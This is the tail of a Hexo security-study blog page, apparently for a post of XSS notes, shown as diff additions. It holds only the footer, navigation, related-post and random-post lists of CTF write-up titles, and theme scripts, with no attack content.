+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2024/03/25/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeudstjqj20zk0m8k3r.jpg" title="sqli-labs��sqlע��ѧϰ�ʼ�">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> ѧϰ�ʼ�</span>
+  <h3>sqli-labs��sqlע��ѧϰ�ʼ�</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2024/04/28/1_1/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclj61ylzj20zk0m8b29.jpg" title="buuctf4月27日">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> 学习笔记</span>
+  <h3>buuctf4月27日</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+      </div>
+      <div class="related panel pjax" data-title="Related">
+        <ul>
+          <li><a href="/2023/12/17/php%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="bookmark" title="PHP学习笔记">PHP学习笔记</a></li><li><a href="/2024/01/24/python-requests%E5%BA%93flask%E5%BA%93%EF%BC%88%E6%9C%AA%E5%AE%8C%EF%BC%89/" rel="bookmark" title="python-requests库flask库（未完）">python-requests库flask库（未完）</a></li><li><a href="/2024/01/24/mysql%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="bookmark" title="mysql学习笔记">mysql学习笔记</a></li><li><a href="/2024/01/24/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="bookmark" title="python学习笔记（未完）">python学习笔记（未完）</a></li><li><a href="/2024/03/25/upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AC%94%E8%AE%B0/" rel="bookmark" title="upload文件上传靶场学习笔记">upload文件上传靶场学习笔记</a></li><li class="active"><a href="/2024/03/31/xss%E7%AC%94%E8%AE%B0/" rel="bookmark" title="xss漏洞学习笔记">xss漏洞学习笔记</a></li><li><a href="/2024/04/28/1_1/" rel="bookmark" title="buuctf4月27日">buuctf4月27日</a></li><li><a href="/2024/04/28/2_1/" rel="bookmark" title="python request库的基本用法">python request库的基本用法</a></li><li><a href="/2024/10/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" rel="bookmark" title="反序列化漏洞总结">反序列化漏洞总结</a></li><li><a href="/2024/10/15/PwnThyBytes%E2%80%94%E2%80%942019-Baby-SQL/" rel="bookmark" title="[PwnThyBytes——2019]Baby_SQL">[PwnThyBytes——2019]Baby_SQL</a></li><li><a href="/2024/12/06/ctfshow-web-java/" rel="bookmark" title="ctfshow_web_java">ctfshow_web_java</a></li><li><a href="/2025/02/19/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="bookmark" title="java反序列化学习笔记">java反序列化学习笔记</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="odiws"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">odiws</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">136</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">7</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">112</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2024/03/25/sql%E6%B3%A8%E5%85%A5/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2024/04/28/1_1/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/11/05/HFCTF2021Quals-Unsetme/" title="[HFCTF2021Quals]Unsetme">[HFCTF2021Quals]Unsetme</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/blog1/" title="In blog1">blog1</a>
+</div>
+
+    <span><a href="/2023/12/10/Test1/" title="Test1">Test1</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="In 学习笔记">学习笔记</a>
+</div>
+
+    <span><a href="/2024/04/28/1_1/" title="buuctf4月27日">buuctf4月27日</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/11/08/HarekazeCTF2019-Sqlite-Voting/" title="[HarekazeCTF2019]Sqlite-Voting">[HarekazeCTF2019]Sqlite-Voting</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/06/17/BJDCTF2020-EzPHP/" title="[BJDCTF2020]ezPHP">[BJDCTF2020]ezPHP</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" title="In 比赛复现">比赛复现</a>
+</div>
+
+    <span><a href="/2024/10/27/SHctf%E5%A4%8D%E7%8E%B02024/" title="SHctf-2024部分复现">SHctf-2024部分复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/10/23/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-include0%E3%80%820/" title="[NewStarCTF2023公开赛道]include0。0">[NewStarCTF2023公开赛道]include0。0</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/ssti/" title="In ssti">ssti</a>
+</div>
+
+    <span><a href="/2024/06/06/%5BRootersCTF2019%5DI_3_Flask/" title="&#39;[RootersCTF2019]I_&lt;3_Flask&#39;">'[RootersCTF2019]I_<3_Flask'</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/11/08/JMCTF2021-UploadHub/" title="[JMCTF2021]UploadHub">[JMCTF2021]UploadHub</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="In 刷题笔记">刷题笔记</a>
+</div>
+
+    <span><a href="/2024/09/25/DDCTF2019-homebreweventloop/" title="[DDCTF2019]homebreweventloop">[DDCTF2019]homebreweventloop</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">odiws @ Yume Shoka</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2024/03/31/xss笔记/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
